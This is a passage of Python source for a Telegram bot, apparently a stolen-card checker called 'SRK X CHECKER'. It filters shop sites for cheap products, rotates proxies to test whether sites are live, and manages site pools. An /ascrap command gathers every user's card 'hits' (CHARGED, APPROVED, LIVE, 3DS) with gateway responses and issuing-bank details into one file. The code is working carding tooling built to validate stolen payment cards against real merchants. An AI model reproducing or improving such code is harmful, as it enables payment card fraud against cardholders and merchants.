                    for v in p.get('variants', []):
                        try:
                            pr = float(str(v.get('price', '0')).replace(',', ''))
                            if pr > 0:
                                prices.append(pr)
                                if min_price is None or pr < min_price: min_price = pr
                                if pr > max_price_seen: max_price_seen = pr
                        except Exception: pass
                if not prices:
                    return {'site': site, 'ok': False, 'reason': 'No prices'}
                if max_price_seen <= max_price:
                    return {'site': site, 'ok': True, 'min_price': round(min_price, 2),
                            'max_price': round(max_price_seen, 2), 'products': len(products)}
                return {'site': site, 'ok': False, 'reason': f'Expensive (max ${max_price_seen:.2f})'}
    except asyncio.TimeoutError:
        return {'site': site_url, 'ok': False, 'reason': 'Timeout'}
    except Exception as e:
        return {'site': site_url, 'ok': False, 'reason': str(e)[:40]}


@bot.on(events.CallbackQuery(pattern=b"^filtersite_add_yes$"))
async def filtersite_add_yes_cb(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("✅ Adding...", alert=False)
    state = _filtersite_state.get(uid, {})
    matched = state.get('matched_sites', [])
    if not matched:
        try: await raw_edit(uid, event.message_id, pe(f"⚠️ 𝗡𝗼 𝘀𝗶𝘁𝗲𝘀"), [])
        except Exception: pass
        return
    existing = set(load_sites())
    added = []
    for m in matched:
        s = m.get('site', '').rstrip('/')
        if s and s not in existing: added.append(s)
    if added:
        async with aiofiles.open(SITES_FILE, 'a') as f:
            for s in added: await f.write(f"{s}\n")
    text = pe(f"[⌯] 𝗦𝗶𝘁𝗲𝘀 𝗔𝗱𝗱𝗲𝗱 ✅\n{SEP}\n[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)}\n[⌯] 𝗔𝗱𝗱𝗲𝗱 ⌁ {len(added)}\n[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(existing) + len(added)}")
    try: await raw_edit(uid, event.message_id, text, [])
    except Exception: pass
    _filtersite_state.pop(uid, None)


@bot.on(events.CallbackQuery(pattern=b"^filtersite_add_no$"))
async def filtersite_add_no_cb(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("✅ Skipped", alert=False)
    try: await raw_edit(uid, event.message_id, pe(f"❌ 𝗡𝗼𝘁 𝗮𝗱𝗱𝗲𝗱"), [])
    except Exception: pass
    _filtersite_state.pop(uid, None)


async def _run_filtersite(uid, sites, max_price):
    proxies = load_proxies()
    if not proxies:
        await bot.send_message(uid, pe(f"❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀"), parse_mode='html'); return
    state = _filtersite_state.get(uid, {})
    if state.get('source') == 'custom' and state.get('sites'): sites = state['sites']
    total = len(sites)
    matched = []; dead = []; expensive = []
    prog_msg_id = None
    try:
        prog_msg = await bot.send_message(uid, pe(f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴 🔍\n{SEP}\n[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,}\n⏳"), parse_mode='html')
        prog_msg_id = prog_msg.id
    except Exception: pass
    last_update = time.time()
    sem = asyncio.Semaphore(3)
    async def scan_one(site):
        async with sem: return await _scan_site_for_max_price(site, max_price, proxies)
    tasks = [asyncio.create_task(scan_one(s)) for s in sites]
    scanned = 0
    for coro in asyncio.as_completed(tasks):
        try: result = await coro
        except Exception: continue
        scanned += 1
        if result.get('ok'): matched.append(result)
        elif 'Expensive' in result.get('reason', ''): expensive.append(result)
        else: dead.append(result)
        now = time.time()
        if now - last_update >= 3 and prog_msg_id:
            last_update = now
            pct = int(100 * scanned / total)
            try:
                await bot.edit_message(uid, prog_msg_id, pe(
                    f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴 🔍\n{SEP}\n"
                    f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ {scanned:,} ({pct}%)\n"
                    f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)}\n"
                    f"[⌯] 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝘃𝗲 ⌁ {len(expensive)}\n"
                    f"[⌯] 𝗗𝗲𝗮𝗱 ⌁ {len(dead)}"
                ), parse_mode='html')
            except Exception: pass
    ts = int(time.time())
    filename = f"/tmp/rxo_uploads/filtered_sites_{ts}.txt"
    os.makedirs("/tmp/rxo_uploads", exist_ok=True)
    async with aiofiles.open(filename, 'w') as f:
        await f.write(f"# Filtered Sites — Max ${max_price}\n")
        for m in sorted(matched, key=lambda x: x.get('min_price', 0)):
            await f.write(f"{m['site']}\n")
    try:
        await bot.edit_message(uid, prog_msg_id, pe(
            f"[⌯] 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ✅\n{SEP}\n"
            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,}\n"
            f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)} ✅\n"
            f"[⌯] 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝘃𝗲 ⌁ {len(expensive)} 💰\n"
            f"[⌯] 𝗗𝗲𝗮𝗱 ⌁ {len(dead)} ❌"
        ), parse_mode='html')
    except Exception: pass
    file_sent = False
    if matched:
        try:
            await bot.send_file(uid, filename, caption=pe(f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿𝗲𝗱 ⌁ {len(matched)} ✅"), parse_mode='html')
            file_sent = True
        except Exception as e:
            await bot.send_message(uid, pe(f"❌ 𝗙𝗶𝗹𝗲 𝗲𝗿𝗿𝗼𝗿 ⌁ {str(e)[:80]}"))
    else:
        await bot.send_message(uid, pe(f"⚠️ 𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝗺𝗮𝘁𝗰𝗵𝗲𝗱"), parse_mode='html')
    try: os.remove(filename)
    except Exception: pass
    if file_sent and matched:
        _filtersite_state[uid] = {'step': 'confirm_add', 'matched_sites': matched}
        confirm_text = pe(f"[⌯] 𝗔𝗱𝗱 𝘁𝗼 𝗣𝗼𝗼𝗹? 🎯\n{SEP}\n[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)} 🔍\n[⌯] 𝗠𝗮𝘅 ⌁ ${max_price}")
        buttons = [[{"text": "✅ Yes", "callback_data": "filtersite_add_yes", "style": "success"},
                    {"text": "❌ No", "callback_data": "filtersite_add_no", "style": "danger"}]]
        try: await raw_send(uid, confirm_text, buttons)
        except Exception: pass
    else:
        _filtersite_state.pop(uid, None)


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ POOL / MYSITES
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/pool$'))
async def pool_cmd(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ Admin only"), parse_mode='html'); return
    enabled = _is_pool_enabled()
    sites_count = len(load_sites()); proxies_count = len(load_proxies())
    status_text = "✅ ON" if enabled else "❌ OFF"
    text = pe(
        f"[⌯] 𝗣𝗼𝗼𝗹 🎛️\n{SEP}\n"
        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_text}\n"
        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {sites_count} 🌐\n"
        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {proxies_count} 📡"
    )
    buttons = [
        [{"text": "✅ ON", "callback_data": "pool_on", "style": "success"},
         {"text": "❌ OFF", "callback_data": "pool_off", "style": "danger"}],
        [{"text": "🔄 Force Check", "callback_data": "pool_check_now", "style": "primary"}],
    ]
    await raw_send(uid, text, buttons)


@bot.on(events.CallbackQuery(pattern=b"^pool_on$"))
async def pool_on_cb(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    _set_pool_enabled(True)
    await event.answer("✅ Pool ENABLED", alert=True)


@bot.on(events.CallbackQuery(pattern=b"^pool_off$"))
async def pool_off_cb(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    _set_pool_enabled(False)
    await event.answer("❌ Pool DISABLED", alert=True)


@bot.on(events.CallbackQuery(pattern=b"^pool_check_now$"))
async def pool_check_now_cb(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("🔄 Checking...", alert=False)
    smsg = await event.respond(pe(f"🔄 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗽𝗼𝗼𝗹..."), parse_mode='html')
    try: await _run_pool_check(smsg)
    except Exception as e:
        try: await smsg.edit(pe(f"❌ Error: {str(e)[:100]}"), parse_mode='html')
        except Exception: pass


async def _run_pool_check(smsg=None):
    sites = load_sites(); proxies = load_proxies()
    alive_sites = []; alive_proxies = []
    if sites and proxies:
        sem = asyncio.Semaphore(3)
        async def check_site(s):
            async with sem:
                try:
                    proxy = random.choice(proxies)
                    r = await asyncio.wait_for(test_site(s, proxy), timeout=30)
                    return s, r.get('status') in ('alive', 'step_error')
                except Exception: return s, False
        tasks = [asyncio.create_task(check_site(s)) for s in sites]
        for coro in asyncio.as_completed(tasks):
            try:
                s, ok = await coro
                if ok: alive_sites.append(s)
            except Exception: pass
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for s in alive_sites: await f.write(f"{s}\n")
    if proxies:
        sem = asyncio.Semaphore(3)
        async def check_proxy(p):
            async with sem:
                try:
                    r = await asyncio.wait_for(test_proxy(p), timeout=15)
                    return p, r.get('status') == 'alive'
                except Exception: return p, False
        tasks = [asyncio.create_task(check_proxy(p)) for p in proxies]
        for coro in asyncio.as_completed(tasks):
            try:
                p, ok = await coro
                if ok: alive_proxies.append(p)
            except Exception: pass
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for p in alive_proxies: await f.write(f"{p}\n")
    if smsg:
        try:
            await smsg.edit(pe(
                f"✅ 𝗣𝗼𝗼𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ✅\n{SEP}\n"
                f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(alive_sites)} 🌐\n"
                f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {len(alive_proxies)} 📡"
            ), parse_mode='html')
        except Exception: pass


@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def mysites_cmd(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ Premium required"), parse_mode='html'); return
    user_sites = get_user_site_list(uid)
    pool_status = "✅ ON" if _is_pool_enabled() else "❌ OFF"
    if user_sites:
        lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{s}</code>" for i, s in enumerate(user_sites[:20])])
    else:
        lines = "[⌯] 𝙽𝚘 𝚜𝚒𝚝𝚎𝚜"
    await event.reply(pe(
        f"[⌯] 𝗠𝘆 𝗦𝗶𝘁𝗲𝘀 🌐\n{SEP}\n"
        f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {pool_status}\n"
        f"[⌯] 𝗬𝗼𝘂𝗿𝘀 ⌁ {len(user_sites)}\n{SEP}\n"
        f"{lines}\n{SEP}\n"
        f"[⌯] /setmysites url1,url2\n[⌯] /clearmysites"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/setmysites\s+'))
async def setmysites_cmd(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ Premium required"), parse_mode='html'); return
    content = event.message.text.split(' ', 1)[1].strip()
    sites = [s.strip() for s in re.split(r'[,\n]', content) if s.strip()]
    if not sites:
        await event.reply(pe(f"❌ No sites"), parse_mode='html'); return
    cleaned = []
    for s in sites:
        if not s.startswith('http'): s = 'https://' + s
        cleaned.append(s)
    set_user_sites(uid, cleaned)
    await event.reply(pe(f"✅ 𝗦𝗶𝘁𝗲𝘀 𝗦𝗮𝘃𝗲𝗱\n{SEP}\n[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cleaned)} 🌐"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/clearmysites$'))
async def clearmysites_cmd(event):
    remove_user_sites(event.sender_id)
    await event.reply(pe(f"✅ 𝗖𝗹𝗲𝗮𝗿𝗲𝗱"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ RMSTEAL / UNSTEAL / STEALLIST
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/rmsteal\s+'))
async def rmsteal_cmd(event):
    uid = event.sender_id
    if uid != STEAL_ADMIN_ID:
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(pe(f"[⌯] 𝗥𝗠 𝗦𝘁𝗲𝗮𝗹 🚫\n{SEP}\n[⌯] /rmsteal user_id"), parse_mode='html'); return
    try: target = int(parts[1])
    except ValueError:
        await event.reply(pe(f"❌ Invalid ID"), parse_mode='html'); return
    _add_steal_block(target)
    await event.reply(pe(f"✅ Blocked <code>{target}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/unsteal\s+'))
async def unsteal_cmd(event):
    uid = event.sender_id
    if uid != STEAL_ADMIN_ID:
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(pe(f"[⌯] 𝗨𝗻𝘀𝘁𝗲𝗮𝗹 ✅\n{SEP}\n[⌯] /unsteal user_id"), parse_mode='html'); return
    try: target = int(parts[1])
    except ValueError:
        await event.reply(pe(f"❌ Invalid ID"), parse_mode='html'); return
    _remove_steal_block(target)
    await event.reply(pe(f"✅ Unblocked <code>{target}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/steallist$'))
async def steallist_cmd(event):
    if event.sender_id != STEAL_ADMIN_ID:
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html'); return
    blocked = _load_steal_blocked()
    if not blocked:
        await event.reply(pe(f"[⌯] 𝗦𝘁𝗲𝗮𝗹 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 📋\n{SEP}\n[⌯] 𝗡𝗼 𝘂𝘀𝗲𝗿𝘀"), parse_mode='html'); return
    lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{u}</code>" for i, u in enumerate(sorted(blocked)[:50])])
    await event.reply(pe(f"[⌯] 𝗦𝘁𝗲𝗮𝗹 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 ⌁ {len(blocked)} 🚫\n{SEP}\n{lines}"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ MAINTENANCE MODE — OWNER ONLY
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/maint(?:\s+(.+))?$'))
async def maint_cmd(event):
    uid = event.sender_id
    if not _is_maint_owner(uid):
        await event.reply(pe("🚫 Owner only!"), parse_mode='html')
        return
    body = (event.pattern_match.group(1) or "").strip().lower()
    data = _load_maint()

    if body in ('on', 'enable', '1'):
        data['global'] = True
        _save_maint(data)
        await event.reply(pe(
            f"[⌯] 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 ⌁ 𝗢𝗡 🛠️\n{SEP}\n"
            f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ 𝗚𝗟𝗢𝗕𝗔𝗟 𝗢𝗡 🚧"
        ), parse_mode='html')
        return

    if body in ('off', 'disable', '0'):
        data['global'] = False
        _save_maint(data)
        await event.reply(pe(
            f"[⌯] 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 ⌁ 𝗢𝗙𝗙 ✅\n{SEP}\n"
            f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ 𝗚𝗟𝗢𝗕𝗔𝗟 𝗢𝗙𝗙 🟢"
        ), parse_mode='html')
        return

    cmds = data.get('commands', [])
    cmd_list = ", ".join([f"/{c}" for c in cmds]) if cmds else "—"
    await event.reply(pe(
        f"[⌯] 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 ⌁ 𝗦𝘁𝗮𝘁𝘂𝘀 🛠️\n{SEP}\n"
        f"[⌯] 𝗚𝗹𝗼𝗯𝗮𝗹 ⌁ {'𝗢𝗡 🚧' if data.get('global') else '𝗢𝗙𝗙 🟢'}\n"
        f"[⌯] 𝗖𝗺𝗱𝘀 ⌁ {cmd_list}\n{SEP}\n"
        f"[⌯] /maint on ⌁ 🚧\n"
        f"[⌯] /maint off ⌁ ✅\n"
        f"[⌯] /maintcmd add /sh ⌁ 🚧\n"
        f"[⌯] /maintcmd list ⌁ 📋"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/maintcmd(?:\s+(.+))?$'))
async def maintcmd_cmd(event):
    uid = event.sender_id
    if not _is_maint_owner(uid):
        await event.reply(pe("🚫 Owner only!"), parse_mode='html')
        return
    body = (event.pattern_match.group(1) or "").strip()
    data = _load_maint()
    cmds = data.get('commands', [])

    if not body:
        await event.reply(pe(
            f"[⌯] 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗖𝗺𝗱 🛠️\n{SEP}\n"
            f"[⌯] /maintcmd add /sh [/msh ...]\n"
            f"[⌯] /maintcmd remove /sh\n"
            f"[⌯] /maintcmd list\n"
            f"[⌯] /maintcmd clear"
        ), parse_mode='html')
        return

    parts = body.split()
    action = parts[0].lower()
    targets = [p.strip().lower().lstrip('/') for p in parts[1:] if p.strip()]

    if action == 'add':
        if not targets:
            await event.reply(pe("❌ Usage: /maintcmd add /sh"), parse_mode='html'); return
        added = []
        for t in targets:
            if t and t not in cmds:
                cmds.append(t); added.append(t)
        data['commands'] = cmds
        _save_maint(data)
        await event.reply(pe(
            f"[⌯] 𝗔𝗱𝗱𝗲𝗱 ✅\n{SEP}\n"
            f"[⌯] {', '.join(['/'+a for a in added]) if added else '—'}\n"
            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cmds)} 🚧"
        ), parse_mode='html')
        return

    if action in ('remove', 'rm', 'del'):
        if not targets:
            await event.reply(pe("❌ Usage: /maintcmd remove /sh"), parse_mode='html'); return
        removed = []
        for t in targets:
            if t in cmds:
                cmds.remove(t); removed.append(t)
        data['commands'] = cmds
        _save_maint(data)
        await event.reply(pe(
            f"[⌯] 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅\n{SEP}\n"
            f"[⌯] {', '.join(['/'+r for r in removed]) if removed else '—'}\n"
            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cmds)}"
        ), parse_mode='html')
        return

    if action in ('list', 'ls'):
        if not cmds:
            await event.reply(pe(f"[⌯] 𝗖𝗺𝗱𝘀 📋\n{SEP}\n[⌯] 𝗡𝗼𝗻𝗲 🟢"), parse_mode='html'); return
        lines = "\n".join([f"[⌯] /{c} 🚧" for c in cmds])
        await event.reply(pe(f"[⌯] 𝗖𝗺𝗱𝘀 ⌁ {len(cmds)} 📋\n{SEP}\n{lines}"), parse_mode='html')
        return

    if action in ('clear', 'reset'):
        data['commands'] = []
        _save_maint(data)
        await event.reply(pe(f"[⌯] 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 ✅\n{SEP}\n[⌯] 𝗔𝗹𝗹 𝗿𝗲𝘀𝘁𝗼𝗿𝗲𝗱 🟢"), parse_mode='html')
        return

    await event.reply(pe(f"❌ Unknown: {action}"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ /ascrap — ADMIN-ONLY: scrape all users' hits into one TXT
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/ascrap(?:\s+(.+))?$'))
async def ascrap_cmd(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("🚫 Owner/Admin only!"), parse_mode='html')
        return

    arg = (event.pattern_match.group(1) or "").strip().lower()
    data = _load_scrap()

    # ── /ascrap clear ──
    if arg == 'clear':
        try:
            _save_scrap({})
        except Exception as e:
            await event.reply(pe(f"❌ Clear failed: {e}"), parse_mode='html')
            return
        await event.reply(pe(
            f"[⌯] 𝗦𝗰𝗿𝗮𝗽 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 🗑️\n{SEP}\n"
            f"[⌯] 𝗔𝗹𝗹 𝗵𝗶𝘁𝘀 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 ✅"
        ), parse_mode='html')
        return

    # ── /ascrap stats (default if no arg) ──
    if not data:
        await event.reply(pe(
            f"[⌯] 𝗦𝗰𝗿𝗮𝗽 ⌁ 📦\n{SEP}\n"
            f"[⌯] 𝗡𝗼 𝗵𝗶𝘁𝘀 𝘀𝘁𝗼𝗿𝗲𝗱 𝘆𝗲𝘁\n{SEP}\n"
            f"[⌯] /ascrap ⌁ 𝘀𝗰𝗿𝗮𝗽 𝗮𝗹𝗹\n"
            f"[⌯] /ascrap clear ⌁ 𝘄𝗶𝗽𝗲"
        ), parse_mode='html')
        return

    if arg in ('stats', 'count'):
        total = sum(len(v.get('hits', [])) for v in data.values())
        by_type = {}
        for v in data.values():
            for h in v.get('hits', []):
                t = h.get('type', 'Unknown')
                by_type[t] = by_type.get(t, 0) + 1
        lines = "\n".join([f"[⌯] {k} ⌁ {v}" for k, v in sorted(by_type.items(), key=lambda x: -x[1])])
        await event.reply(pe(
            f"[⌯] 𝗦𝗰𝗿𝗮𝗽 𝗦𝘁𝗮𝘁𝘀 📊\n{SEP}\n"
            f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {len(data)} 👥\n"
            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁𝘀 ⌁ {total} 🎯\n{SEP}\n"
            f"{lines}"
        ), parse_mode='html')
        return

    # ── Scrap: build TXT ──
    smsg = await event.reply(pe(f"[⌯] 𝗦𝗰𝗿𝗮𝗽𝗶𝗻𝗴... ⏳\n{SEP}\n[⌯] 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁"), parse_mode='html')

    try:
        filter_type = arg.upper() if arg and arg not in ('all', '') else None
        # valid filters: CHARGED, APPROVED, LIVE, 3DS
        valid = {'CHARGED', 'APPROVED', 'LIVE', '3DS'}
        if filter_type and filter_type not in valid:
            filter_type = None

        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        os.makedirs('/tmp/rxo_uploads', exist_ok=True)
        fname = f"/tmp/rxo_uploads/ascrap_{ts}.txt"

        D = "─" * 60
        total_hits = 0
        total_users = 0

        with open(fname, 'w', encoding='utf-8') as f:
            f.write(f"{'═' * 60}\n")
            f.write(f"  SRK X CHECKER — SCRAPED HITS\n")
            f.write(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            if filter_type:
                f.write(f"  Filter: {filter_type}\n")
            f.write(f"{'═' * 60}\n\n")

            for ukey, uinfo in data.items():
                hits = uinfo.get('hits', [])
                if filter_type:
                    hits = [h for h in hits if (h.get('type', '').upper() == filter_type)]
                if not hits:
                    continue

                total_users += 1
                # try to get display name
                try:
                    dname = await get_display_name(int(ukey))
                except Exception:
                    dname = f"User {ukey}"

                f.write(f"{D}\n")
                f.write(f"  USER: {dname}\n")
                f.write(f"  ID:   {ukey}\n")
                f.write(f"  Hits: {len(hits)}\n")
                f.write(f"{D}\n\n")

                # group by type for readability
                for h in hits:
                    total_hits += 1
                    htype = h.get('type', 'Unknown')
                    card = h.get('card', 'N/A')
                    msg = h.get('message', '') or '-'
                    price = h.get('price', '-') or '-'
                    gw = h.get('gateway', '') or '-'
                    bi = h.get('bin_info') or []
                    ts_h = h.get('ts', 0)
                    dt = datetime.fromtimestamp(ts_h).strftime('%Y-%m-%d %H:%M:%S') if ts_h else '-'

                    f.write(f"  [{htype}]  {card}\n")
                    f.write(f"    Response : {msg[:120]}\n")
                    f.write(f"    Amount   : {price}\n")
                    f.write(f"    Gateway  : {gw}\n")
                    if bi and len(bi) >= 6:
                        brand, btype, level, bank, country, flag = bi[:6]
                        f.write(f"    BIN Info : {brand} | {btype} | {level}\n")
                        f.write(f"    Bank     : {bank} | {country} {flag}\n")
                    f.write(f"    Time     : {dt}\n\n")

            f.write(f"{'═' * 60}\n")
            f.write(f"  TOTAL: {total_hits} hits from {total_users} users\n")
            f.write(f"{'═' * 60}\n")

        if total_hits == 0:
            try: os.remove(fname)
            except Exception: pass
            await smsg.edit(pe(
                f"[⌯] 𝗦𝗰𝗿𝗮𝗽 ⌁ 📦\n{SEP}\n"
                f"[⌯] 𝗡𝗼 𝗵𝗶𝘁𝘀 𝗳𝗼𝘂𝗻𝗱"
                + (f" 𝗳𝗼𝗿 𝗳𝗶𝗹𝘁𝗲𝗿 ⌁ {filter_type}" if filter_type else "")
            ), parse_mode='html')
            return

        caption = pe(
            f"[⌯] 𝗦𝗰𝗿𝗮𝗽 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ✅\n{SEP}\n"
            f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {total_users} 👥\n"
            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁𝘀 ⌁ {total_hits} 🎯\n"
            + (f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿 ⌁ {filter_type}\n" if filter_type else "")
            + f"{SEP}\n[⌯] 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 ⌁ {ts}"
        )
        await bot.send_file(uid, fname, caption=caption, parse_mode='html')
        try: os.remove(fname)
        except Exception: pass
        try: await smsg.delete()
        except Exception: pass

    except Exception as e:
        try:
            await smsg.edit(pe(f"❌ 𝗦𝗰𝗿𝗮𝗽 𝗳𝗮𝗶𝗹𝗲𝗱\n{SEP}\n<code>{str(e)[:200]}</code>"), parse_mode='html')
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ /addgif, /listgifs, /rmgif, /cleargifs — ADMIN ONLY
# ══════════════════════════════════════════════════════════════════════════════
_pending_gif: dict = {}  # {admin_uid: True} — awaiting gif/link


@bot.on(events.NewMessage(pattern=r'^/addgif$'))
async def addgif_cmd(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n" + SEP + "\n❌ Admin only!"), parse_mode='html')
        return

    _pending_gif[uid] = True
    gifs = load_gifs()
    await event.reply(pe(
        f"[⌯] 𝗔𝗱𝗱 𝗚𝗶𝗳 ⌁ 📤\n{SEP}\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 𝗚𝗶𝗳𝘀 ⌁ {len(gifs)} 🎬\n{SEP}\n"
        f"[⌯] 𝗦𝗲𝗻𝗱 𝗺𝗲 𝗮 𝗚𝗜𝗙, 𝗮 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗳𝗶𝗹𝗲, 𝗼𝗿 𝗮 𝗱𝗶𝗿𝗲𝗰𝘁 𝗹𝗶𝗻𝗸\n"
        f"[⌯] 𝗢𝗿 /cancel 𝘁𝗼 𝗮𝗯𝗼𝗿𝘁 ⛔"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/cancel$'))
async def addgif_cancel(event):
    uid = event.sender_id
    if uid in _pending_gif:
        _pending_gif.pop(uid, None)
        await event.reply(pe("✅ 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/listgifs$'))
async def listgifs_cmd(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("🚫 Admin only!"), parse_mode='html'); return
    gifs = load_gifs()
    if not gifs:
        await event.reply(pe(f"[⌯] 𝗚𝗶𝗳𝘀 ⌁ 🎬\n{SEP}\n[⌯] 𝗡𝗼𝗻𝗲 🟢"), parse_mode='html')
        return
    lines = []
    for i, g in enumerate(gifs[:30]):
        # shorten long URLs
        g_short = g if len(g) < 60 else (g[:57] + "...")
        lines.append(f"[⌯] {i+1} ⌁ <code>{g_short}</code>")
    more = f"\n<i>...and {len(gifs)-30} more</i>" if len(gifs) > 30 else ""
    await event.reply(pe(
        f"[⌯] 𝗚𝗶𝗳𝘀 ⌁ {len(gifs)} 🎬\n{SEP}\n" + "\n".join(lines) + more + f"\n{SEP}\n"
        f"[⌯] /rmgif &lt;number&gt; ⌁ 𝗿𝗲𝗺𝗼𝘃𝗲 ⌁ 🗑️\n"
        f"[⌯] /cleargifs ⌁ 𝘄𝗶𝗽𝗲 𝗮𝗹𝗹"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmgif(?:\s+(\d+))?$'))
async def rmgif_cmd(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("🚫 Admin only!"), parse_mode='html'); return
    m = event.pattern_match.group(1)
    if not m:
        await event.reply(pe("❌ Usage: /rmgif &lt;number&gt;\nSee /listgifs"), parse_mode='html'); return
    try:
        idx_remove = int(m) - 1
    except Exception:
        await event.reply(pe("❌ Invalid number"), parse_mode='html'); return
    gifs = load_gifs()
    if idx_remove < 0 or idx_remove >= len(gifs):
        await event.reply(pe(f"❌ Invalid index (1-{len(gifs)})"), parse_mode='html'); return
    removed = gifs.pop(idx_remove)
    try:
        remove_gif(removed)
    except Exception:
        # fallback: rewrite file
        from storage import GIFS_FILE  # type: ignore
        with open(GIFS_FILE, 'w') as f:
            for g in gifs:
                f.write(f"{g}\n")
